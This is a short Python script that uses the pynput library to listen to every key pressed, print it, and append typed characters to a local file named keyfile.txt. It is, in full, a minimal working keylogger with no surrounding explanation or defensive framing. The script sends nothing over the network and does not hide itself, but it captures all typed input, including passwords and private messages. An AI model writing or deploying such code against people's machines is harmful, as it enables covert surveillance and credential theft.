from pynput import keyboard

def whenkeyPressed(key):
    print(str(key))
    with open("keyfile.txt", 'a') as logKey:
        try:
            char = key.char
            logKey.write(char)
        except:
            print("Error getting char")

if __name__ == "__main__":
    catchthem = keyboard.Listener(on_press=whenkeyPressed)
    catchthem.start()
    input()